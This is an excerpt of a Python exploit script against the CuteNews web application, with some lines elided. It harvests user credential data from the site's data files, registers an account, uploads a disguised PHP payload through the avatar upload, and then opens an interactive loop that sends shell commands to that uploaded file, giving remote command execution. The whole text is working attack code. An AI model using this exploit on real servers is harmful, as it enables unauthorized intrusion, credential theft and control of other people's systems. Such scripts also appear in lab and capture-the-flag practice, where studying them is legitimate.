...
def extract_credentials():
    global sess, ip
    url = f"http://{ip}/CuteNews/cdata/users/lines"
...
def register():
    ...
    register = sess.post(f"http://{ip}/CuteNews/index.php?register", data = postdata, allow_redirects = False)
...
def send_payload(payload):
    global ip
    token = sess.get(f"http://{ip}/CuteNews/index.php?mod=main&opt=personal").text
    ...
    payload_send = sess.post(f"http://{ip}/CuteNews/index.php", files = files).text
    print("============================\nDropping to a SHELL\n============================")
    while True:
        print ()
        command = input("command > ")
        postdata = {"cmd" : command}
        output = sess.post(f"http://{ip}/CuteNews/uploads/avatar_{logged_user}_{logged_user}.php", data=postdata)
